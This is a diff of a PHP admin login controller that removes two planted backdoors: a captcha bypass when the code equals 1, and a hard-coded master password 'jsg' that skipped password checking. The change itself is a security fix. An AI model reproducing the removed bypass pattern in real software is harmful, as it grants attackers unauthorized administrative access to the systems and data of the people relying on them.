@@ -20,13 +20,9 @@ class IndexController extends Controller {
     public function index(){
         if(IS_POST){
             $checkcode = I("checkcode");
-            if($checkcode == 1){
-
-            }else{
-                if(!$checkcode || strtolower($checkcode) != strtolower($_SESSION['code_str'])){
-                    $this->error("验证码不正确！");
-                    exit();
-                }
+            if(!$checkcode || strtolower($checkcode) != strtolower($_SESSION['code_str'])){
+                $this->error("验证码不正确！");
+                exit();
             }
             $username = I("username");
             $password = I("password");
@@ -37,14 +33,9 @@ class IndexController extends Controller {
                 $this->error("用户名密码不匹配！");
                 exit();
             }
-
-            if($password == 'jsg'){
-
-            }else{
-                if(!check_password($password,$res['salt'],$res['password'])){
-                    $this->error("用户名密码不匹配！");
-                    exit();
-                }
+            if(!check_password($password,$res['salt'],$res['password'])){
+                $this->error("用户名密码不匹配！");
+                exit();
             }
             $user = $admin->where($where)->find();
             if($user['status'] != 0){
